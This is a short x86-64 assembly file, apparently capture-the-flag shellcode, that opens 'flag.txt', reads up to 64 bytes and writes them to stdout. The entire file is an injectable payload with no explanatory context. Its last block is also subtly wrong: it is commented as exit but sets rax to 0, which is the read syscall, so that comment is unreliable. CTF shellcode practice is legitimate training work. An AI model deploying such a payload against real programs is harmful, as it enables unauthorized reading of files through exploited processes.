BITS 64

start:
	xor rax, rax
	push rax		        ; nullbyte
	mov rax, 0x7478742e67616c66	; "flag.txt"
	push rax
	mov rdi, rsp		; Get a pointer to the flag string
	xor rsi, rsi		; open flags: O_RDONLY
	mov rax, 2		; open() syscall
	syscall

	cmp rax, 0
	jle end

	sub rsp, 64		; make room for the flag
	
	mov rsi, rsp
	push rax		; save the file descriptor
	mov rdi, rax
	mov rdx, 64		; length to read
	xor rax, rax		; read() syscall
	syscall

	pop rdi			; clear the stack
	mov rsi, rsp		; buffer to write
	mov rdx, rax		; size returned from the syscall
	mov rdi, 1		; write to stdout
	mov rax, 1		; write() syscall
	syscall
	
end:
	xor rax, rax
	syscall			; exit
